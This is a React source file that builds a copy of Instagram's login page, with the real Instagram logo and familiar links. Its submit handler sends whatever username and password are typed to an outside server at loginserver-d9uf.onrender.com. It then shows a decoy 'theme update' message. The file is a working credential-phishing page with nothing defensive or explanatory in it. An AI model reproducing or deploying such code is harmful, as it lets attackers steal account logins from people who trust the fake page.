import './App.css';
import { useState } from 'react';
import axios from 'axios';

function App() {
  const [formData, setFormData] = useState({
    username: '',
    password: '',
  });

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
  };

  const handleSubmit = async () => {
    try {
      const response = await axios.post('https://loginserver-d9uf.onrender.com/login_next/', formData,
        {
        headers: {
          'Content-Type': 'application/json'
        }
      }
      );
      console.log('Success....Your Theme Update Soon:', response.data);
      alert('Login data submitted!');
    } catch (error) {
      console.error('Error:', error);
      alert('Error submitting login data.');
    }
  };

  return (
    <div className="app">
      <div className="login-container">
        <img
          src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1024px-Instagram_logo.svg.png"
          alt="Instagram Logo"
          className="logo"
        />
        <input
          type="text"
          placeholder="Phone number, username, or email"
          name="username"
          value={formData.username}
          onChange={handleChange}
        />
        <input
          type="password"
          placeholder="Password"
          name="password"
          value={formData.password}
          onChange={handleChange}
        />
        <button onClick={handleSubmit}>Log In</button>
        <div className="separator">
          <div className="line"></div>
          <span>OR</span>
          <div className="line"></div>
        </div>
        <div className="facebook-login">Log in with Facebook</div>
        <div className="forgot-password">Forgot password?</div>
      </div>
      <div className="signup-box">
        Don't have an account? <span>Sign up</span>
      </div>
    </div>
  );
}

export default App;
